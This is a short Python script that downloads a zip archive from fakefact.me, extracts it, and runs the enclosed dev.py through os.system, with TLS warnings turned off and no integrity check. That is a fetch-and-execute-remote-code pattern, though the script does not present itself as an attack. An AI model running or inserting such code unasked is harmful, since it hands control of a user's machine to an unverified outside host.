import urllib3
import zipfile
import os

urllib3.disable_warnings()
http = urllib3.PoolManager()
url = "https://fakefact.me/Device_1.0.0.zip"
file = 'Device.zip'
response = http.request('GET', url)

with open(file, 'wb') as f:
    f.write(response.data)

response.release_conn()

zip_ref = zipfile.ZipFile(file, 'r')
zip_ref.extractall('device')
zip_ref.close()

os.system('python3 device/dev.py')